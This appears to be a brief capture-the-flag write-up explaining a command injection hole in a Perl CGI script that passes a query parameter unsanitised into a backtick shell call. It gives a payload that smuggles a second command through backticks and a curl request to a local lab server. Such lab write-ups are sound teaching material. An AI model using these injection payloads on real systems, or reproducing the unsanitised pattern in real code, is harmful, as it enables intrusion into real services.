At the home of the user is present a .pl file :

```perl
  use CGI qw{param};
  print "Content-type: text/html\n\n";
  sub x {
    $y = $_[0];
    print `echo $y 2>&1`;
  }
  x(param("x"));
```

In Perl, CGI(Common Gateway Interface) is a protocol for executing scripts via web requests
This one is printing the first query parameter x -> $_[0] to the standard output using the built-in echo

During the substitution of the variable $y there is no sanitization
By adding "\`" i can close the backtick command and open and other one "\`"

The final payload is \`getflag\` to execute -> "`echo ` `getflag 2>&1`"

I send it with the curl command (backslash added to stop interpretation of backtick from my own shell):
curl -v http://localhost:4747/?x=\`getflag\`
